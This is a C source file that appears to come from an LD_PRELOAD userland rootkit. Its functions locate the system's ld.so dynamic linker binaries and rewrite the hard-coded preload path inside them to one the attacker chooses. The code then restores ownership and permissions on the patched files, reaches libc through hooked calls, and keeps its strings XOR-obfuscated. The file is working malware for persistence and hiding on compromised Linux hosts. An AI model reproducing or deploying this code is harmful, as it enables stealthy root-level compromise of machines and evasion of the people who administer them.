/* overwrites, in the contents of path, whatever oldpreload contains with whatever newpreload contains.
 * if the return value is 0 then either:
 *    bindup failed. presumably because path doesn't exist.
 *    allocating memory for path's contents failed.
 * if the return value is <0 something went horribly wrong. otherwise everything went ok. */
int _ldpatch(const char *path, const char *oldpreload, const char *newpreload){
    unsigned char *buf;
    char tmppath[strlen(path)+5];
    FILE *ofp, *nfp;
    u_long fsize;
    size_t n;
    mode_t ldmode;
    const size_t olen = strlen(oldpreload);

    hook(CFOPEN, CRENAME, CCHMOD, CFWRITE, CFREAD);

    // bindup ignores links.
    snprintf(tmppath, sizeof(tmppath), "%s.tmp", path);
    ofp = bindup(path, tmppath, &nfp, &fsize, &ldmode);
    if(ofp == NULL) return 0;

    buf = malloc(fsize+1);
    if(!buf){
        fcloser(2, ofp, nfp);
        return 0;
    }
    memset(buf, 0, fsize+1);
    n = (size_t)call(CFREAD, buf, 1, fsize, ofp);
    fclose(ofp);

    u_int count = 0, // when this is strlen(preloadpath) we have a match & have arrived at the end of the string. then we overwrite, from the beginning.
          c = 0;     // position of the curent character in the string that we're writing over the original with.

    if(n){
        for(u_long i = 0; i < fsize; i++){
            if(buf[i] == oldpreload[count]){
                if(count == olen){ // finally.. we have arrived.
                    for(u_long x = i-olen; x < i; x++)
                        memcpy(&buf[x], &newpreload[c++], 1); // 18 memcpys to rule them all
                    break; // we are done here.
                }

                // looks like we could be getting closer...
                ++count;
            }else count=0; // reset. buf[i] is not a match.
        }

        call(CFWRITE, buf, 1, fsize, nfp);
        fflush(nfp);
    }
    bfree(buf, fsize+1);
    fclose(nfp);

    if(count != olen){  // oldpreload was not found.
        rm(tmppath);   // remove tmp file.
        return -2;    // this is worth noting.
    }

    /* move ld.so.tmp to ld.so */
    if((long)call(CRENAME, tmppath, path) < 0)
        return -1;
    else if((long)call(CCHMOD, path, ldmode) < 0)
        return -1;
    else if(chownpath(path, 0) < 0)
        return -1;

    return 1;
}

/* returns the amount of successful patches. */
int ldpatch(const char *oldpreload, const char *newpreload){
    int allf, rv = 0;

    char **foundld = ldfind(&allf, MAX_LD_SO);
    if(foundld == NULL)
        return -3;

    for(int i=0; i<allf; i++){
        int p = _ldpatch(foundld[i], oldpreload, newpreload);
        if(p < 0){
            for(int j=0; j<i; j++)
                clean(foundld[j]);
            free(foundld);
            return p;
        }else if(p) ++rv;
        clean(foundld[i]);
    }

    free(foundld);
    return rv;
}

int patch_on_install(const char *preloadpath){
    bxprintf(PATCHING_MESSAGE, 0);
    char *op = xordup(OLD_PRELOAD);
    int p = ldpatch(op, preloadpath);
    clean(op);

    if(p < 0){
        bxprintf(SOMETHING_WENT_WRONG, 0);
        switch(p){
            case -2:
                bxprintf(OLD_PRELOAD_NOT_FOUND, 0);
                op = xordup(OLD_PRELOAD);
                bxprintf(OLD_PRELOAD_STRING, op);
                clean(op);
                break;
            case -3:
                bxprintf(MEMORY_ALLOC_FAILED, 0);
                break;
            default:
                bxprintf(FINAL_STAGES_FAILED, 0);
        }
        return -1;
    }else if(p > 0) bxprintf(PATCHED_COUNT_STRING, p);
    else{
        /* p == 0 == nothing was patched? */
        bxprintf(NOTHING_TO_PATCH, 0);
        return -1;
    }

    return 0;
}